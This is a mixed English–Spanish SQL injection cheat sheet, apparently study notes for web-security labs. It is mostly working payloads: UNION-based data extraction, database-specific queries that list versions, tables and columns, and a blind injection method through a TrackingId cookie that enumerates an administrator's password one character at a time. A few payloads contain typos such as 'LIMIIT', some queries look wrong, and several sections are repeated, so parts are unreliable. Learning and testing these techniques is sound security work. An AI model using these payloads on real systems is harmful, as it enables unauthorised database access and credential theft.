# SQL INJECTION
## Retrieving hidden data
```
'OR 1=1--
'OR+1=1--
```
## Subverting application logic
```
SELECT * FROM users WHERE username = 'administrator'--'
-- Comment line
```
## Retrieving data from other database tables (UNION)

### Get number of columns

**Metodo 1**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
**Metodo 2**
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
### Database-specific syntax
```
ORACLE
UNION SELECT 'Other Value', 2 FROM DUAL--

DB2
UNION SELECT 'Other Value', 2 FROM SYSIBM.SYSDUMMY1--

Para las demás:
UNION SELECT NULL, NULL--
```
### Finding columns with a useful data type
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieving data from other tables
```
Requisitos
-Conocer el nombre de la tabla
-Conocer el nombre de las columnas
Ejemplo:
'UNION SELECT username, password FROM users--
```

### Retrieve interesting data // Examining the database 
**Database type and version**

| Database            | Query                     |
| ------------------- | ------------------------- |
| Microsoft SQL Server| `SELECT @@version`        |
| MySQL               | `SELECT @@version`        |
| Oracle              | `SELECT * FROM v$version` |
| PostgreSQL          | `SELECT version()`        |
| SQLite              | `SELECT sqlite_version()` |
| MariaDB             | `SELECT @@version`        |
| IBM Db2             | `SELECT service_level, fixpack_num FROM TABLE (sysproc.env_get_inst_info())` |
| Amazon Aurora       | `SELECT version()`        |
| SAP HANA            | `SELECT VERSION FROM SYS.M_DATABASE` |
| Amazon RDS          | `SELECT version()`        |
| Google Cloud SQL    | `SELECT version()`        |
| Teradata            | `SELECT INFO FROM dbc.dbcinfo` |
| Informix            | `SELECT DBINFO('version','full') FROM systables WHERE tabid = 1` |
| InterBase           | `SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database` |
| Firebird            | `SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database` |
| Snowflake           | `SELECT CURRENT_VERSION()` |
| Vertica             | `SELECT version()`        |
| Netezza             | `SELECT VERSION()`        |
| Clustrix            | `SELECT CLUSTRIX_VERSION()` |

**Listing the contents of the database**
| Database            | Query                                  |
| ------------------- | -------------------------------------- |
| Microsoft SQL Server| `SELECT * FROM information_schema.tables` |
| MySQL               | `SELECT * FROM information_schema.tables` |
| Oracle              | `SELECT * FROM all_tables`             |
| PostgreSQL          | `SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--` |
| SQLite              | `SELECT name FROM sqlite_master WHERE type='table'` |
| MariaDB             | `SELECT * FROM information_schema.tables` |
| IBM Db2             | `SELECT * FROM syscat.tables`          |
| Amazon Aurora       | `SELECT * FROM information_schema.tables` |
| SAP HANA            | `SELECT * FROM tables`                 |
| Amazon RDS          | `SELECT * FROM information_schema.tables` |
| Google Cloud SQL    | `SELECT * FROM information_schema.tables` |
| Teradata            | `SELECT * FROM dbc.tables`             |
| Informix            | `SELECT * FROM systables`              |
| InterBase           | `SELECT * FROM RDB$RELATIONS WHERE RDB$RELATION_TYPE = 0` |
| Firebird            | `SELECT * FROM RDB$RELATIONS WHERE RDB$RELATION_TYPE = 0` |
| Snowflake           | `SHOW TABLES`                          |
| Vertica             | `SELECT * FROM v_catalog.tables`       |
| Netezza             | `SELECT * FROM _v_table`               |
| Clustrix            | `SELECT * FROM information_schema.tables` |

**Lista solo las tablas creadas por el susuario**
| Database            | Query                                                                                   |
| ------------------- | --------------------------------------------------------------------------------------- |
| Microsoft SQL Server| `SELECT table_name FROM information_schema.tables WHERE table_schema = 'dbo' AND table_type = 'BASE TABLE';` |
| MySQL               | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Oracle              | `SELECT table_name FROM user_tables;`                                                   |
| PostgreSQL          | `SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE';` |
| SQLite              | `SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%';`        |
| MariaDB             | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| IBM Db2             | `SELECT table_name FROM syscat.tables WHERE tabschema = 'YOUR_SCHEMA' AND type = 'T';`  |
| Amazon Aurora       | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| SAP HANA            | `SELECT table_name FROM tables WHERE schema_name = 'YOUR_SCHEMA';`                      |
| Amazon RDS          | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Google Cloud SQL    | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Microsoft Access    | `SELECT Name FROM MSysObjects WHERE Type=1 AND Flags=0;`                                 |
| Teradata            | `SELECT table_name FROM dbc.tables WHERE tablekind = 'T' AND databasename = 'your_database_name';` |
| Informix            | `SELECT tabname FROM systables WHERE tabtype = 'T';`                                     |
| InterBase           | `SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0;`                |
| Firebird            | `SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0;`                |
| Snowflake           | `SHOW TABLES IN SCHEMA YOUR_SCHEMA;`                                                    |
| Vertica             | `SELECT table_name FROM v_catalog.tables WHERE is_system_table = false;`                |
| Netezza             | `SELECT table_name FROM _v_table WHERE objtype = 'TABLE';`                              |
| Clustrix            | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |

**Lista las columnas de la tabla**

| Database            | Query                                                                                              |
| ------------------- | -------------------------------------------------------------------------------------------------- |
| Microsoft SQL Server| `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| MySQL               | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Oracle              | `SELECT column_name, data_type FROM user_tab_columns WHERE table_name = 'TABLE';`                   |
| PostgreSQL          | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| SQLite              | `PRAGMA table_info('table');`                                                                      |
| MariaDB             | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| IBM Db2             | `SELECT colname, typename FROM syscat.columns WHERE tabname = 'TABLE';`                            |
| Amazon Aurora       | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| SAP HANA            | `SELECT column_name, data_type FROM public.tables WHERE table_name = 'TABLE';`                      |
| Amazon RDS          | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Google Cloud SQL    | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Microsoft Access    | `SELECT Name, Type FROM MSysObjects WHERE Type=1 AND Flags=0;`                                      |
| Teradata            | `SELECT columnname, columntype FROM dbc.columns WHERE tablename = 'TABLE';`                        |
| Informix            | `SELECT colname, coltype FROM syscolumns WHERE tabname = 'table';`                                 |
| InterBase           | `SELECT RDB$FIELD_NAME, RDB$FIELD_TYPE FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME = 'TABLE';` |
| Firebird            | `SELECT RDB$FIELD_NAME, RDB$FIELD_TYPE FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME = 'TABLE';` |
| Snowflake           | `SHOW COLUMNS IN TABLE table;`                                                                     |
| Vertica             | `SELECT column_name, data_type FROM v_catalog.columns WHERE table_name = 'table';`                  |
| Netezza             | `SELECT columnname, datatype FROM _v_relation_column WHERE tablename = 'TABLE';`                    |
| Clustrix            | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |

**Blind SQL Guia**
1. Identifica el parametro inyectable `TrackingId`
2. Genera un error de sintaxis básico  y ve su coportamiento, ejemplo una comilla simple `TrackingId=xyz'` esto debería generar un error
3. Ahora dos comillas `TrackingId=xyz''` con esto verificamos que el error anterior se elimina
4. Se crea un comando de subconsulta `TrackingId=xyz'||(SELECT '')||'` para SQL y para Oracle `TrackingId=xyz'||(SELECT '' FROM dual)||'` 
- Verificar inyeción en las cookies y verificar su comportamiento con una sentencia Falsa o Verdadero (1=1, 1=0)
- Identificar posibles tablas y columnas a traves de fuerza bruta
- Conocer el tamaño del objetivo a enumerar > `' AND (SELECT len(password) from users where username = 'administrator')='§1§'--`
- Ejecución de un cluster bomb para enumerar datos sensibles > `' AND (SELECT substring(password,§1§,1) from users where username = 'administrator')='§x§'--`

## Identificación SQL Blind
### Encontrar donde es inyectable 
Usualmente puede ser una cookie, por lo que las inyecciones serán a través de la modificación de la cookie y actualizando la página

### Encontrar la cantidad de campos
- A diferencia de una inyección NO BLIND, no es tan relevante ya que aquí no existe información visible, la intención de blind es identificar datos a través del comportamiento de la aplicación, generando errores intencionados para identificar si un dato es verdadero o falso
- En este tipo de inyección no es tan impportante identificar el tipo de datos ya que solo nos guiaremos a partir del comportamiento, aunque el tipo de dato si debe ser considerado en las consultas que se vayan a realizar

### Base SQL Blind
La base de SQL blind es la manipulación sin una respuesta especifica, puede ser tambien a traves de la generación de errores intencionados,  es decir se inyectan consultas verdaders y falsas para poder conocer el comportamiento de la aplicación y aprtir de esto generar subconsultas
- Existen  los errores de logica 1=2
- Existen errores de aritmeticos 1/0
- Errores de sintaxis Selet * from dual; substring (1,1 'string')

Los pasos son los siguientes:
**1** Generación de error de sintaxis y lógica
```
Suponiendo la siguiente consulta: SELECT ID FROM TRACKING WHERE ID = 'xyz'
El valor del ID es xyz

Error básico 1: Añadir una comilla simple ' => xyz' => Esto es un error de sintaxis porque el caracter indica un inicio o cierre de un dato por que estaría incompleto
  SELECT ID FROM TRACKING WHERE ID = 'xyz''
Error básico 2: Añadir dos comillas simples ' => xyz' => Esto es como una cadena vacia o un NULL ya que esta indicando el inicio y termino de una cadena vacia
  SELECT ID FROM TRACKING WHERE ID = 'xyz'''

Errores lógicos para validar
Error confirmación verdadero ' AND '1'='1  ó ' AND '1'='1'-- => Es importante ver el comportamiento cuando se genera una acción adicional
  SELECT ID FROM TRACKING WHERE ID = 'xyz AND '1'='1' Ó SELECT ID FROM TRACKING WHERE ID = 'xyz' AND '1'='1'--'
Error confirmación falso 'AND '1'='2 ó AND ' AND '1'='2'-- => Es importante ver el comportamiento cuando se genera una acción adicional
  SELECT ID FROM TRACKING WHERE ID = 'xyz'AND '1'='2' ó SELECT ID FROM TRACKING WHERE ID = 'xyz' AND '1'='2'--
Lo anterior confirmará que el error de sintaxis tiene efecto en la aplciación
```
**2**Confirmar que la inyección se interpreta como una consulta, es decir que llega al backend
```
Suponiendo la siguiente consulta: SELECT ID FROM TRACKING WHERE ID = 'xyz'
El valor del ID es xyz

*Imporante se debe considerar que tipo de base de datos se esta utilizando ya que podria existir para que esto sea efectivo, si la sintaxis es correcta y no genera resultados se debe considerar elegir otra sintaxis de otra base de datos o considerar que esta siendo filtrada la salida
PARA PostgreSQL
TrackingId=xyz'||(SELECT '')||' => Esto genera una subconsulta vacia
PARA MS SQL
TrackingId=xyz'+(SELECT '')+' => Esto genera una subconsulta vacia
PARA MYSQL
TrackingId=xyz' (SELECT '') ' => Esto genera una subconsulta vacia
PARA ORACLE
TrackingId=xyz'||(SELECT '' FROM dual)||'

Una vez confirmada la consulta, genera una consulta invalida, esto confirmara que el back-end esta procesando la inyeccion como una consulta SQL
PARA PostgreSQL
TrackingId=xyz'||(SELECT '' FROM tabla-imaginaria )||' => Esto genera una subconsulta vacia
```
**3**Consultas clave
```
Intenta siempre generar consulta SQL sintacticamente validas, para obtener información clave utilizando errores para inferir la información clave ejemplos

[Oracle]  TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación

[MS SQL]  TrackingId=xyz'||(SELECT '' FROM users WHERE LIMIIT = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación

```

**4**Consultas clave a través de condiciones
```
A través de un operador lógico(=,>,<, etc), se genera una consulta para verificar un dato, puede ser su existencia, hasta la enumeración del mismo
  TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a                                                            =>Verifica la existencia de un parametro
  TrackingId=xyz' AND (SELECT 'x' FROM users WHERE username='administrator' and LENGTH(password)=$1$)='x            =>Obtiene la longitud de un parametro
  TrackingId=xyz' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$             =>Enumera un parametro

A través de un CASE
  TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a

A traves de un IF
  TrackingId=xyz' AND (SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a'))

```

# SQL Blind

## Errores de lógica
```
'AND '1'='1											=>Valor verdadero
'AND '1'='2											=>Valor falso
```
## Subconsultas condicionales
```
' AND (SELECT 'a' FROM users LIMIT 1)='a																                            =>Verifica la existencia de la tabla usuario
' AND (SELECT 'a' FROM users WHERE username='administrator')='a											                =>Verifica la existencia del usuario administrador
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a					    =>Verifica el tamaño de la contraseña de un admin 
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a		=>Enumerar contraseña

**NOTA** Depues la consulta base se pueden añadir el comentario -- ## ejemplo
' AND (SELECT 'a' FROM users LIMIT 1)='a--
```
## Generación de errores de sintaxis básico
```
'					=> Error
''				=> Cadena vacia
```
## Generación de errores de sintaxis básico
### Error de sintaxis
` ' `
### Cadena vacia
` '' `
## Generación de errores de sintaxis básico
### Error de sintaxis ` ' `
### Cadena vacia ` '' `

## Generación de errores de sintaxis básico
- Error de sintaxis ` ' `
- Cadena vacia ` '' `

## Subconsultas concatenadas
```
'||(SELECT '')||'																														=>Concatenar subconsulta verdadera
'||(SELECT '' FROM dual)||'																									=>Consulta vacia Oracle
'||(SELECT '' FROM TablaQueNoExiste)||'																			=>Consulta comporatmiento antes una tabla que no existe 
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'																=>Verifica la existencia de una tabla y limita la salida a 1 para no recibir de más [Oracle]
'||(SELECT '' FROM users WHERE LIMIT 1)||'																	=>Verifica la existencia de una tabla y limita la salida a 1 para no recibir de más
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'			=>Consulta base de inferencia con sentencia verdadera
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'			=>Consulta base de inferencia con sentencia falsa
```


## Cheat Sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
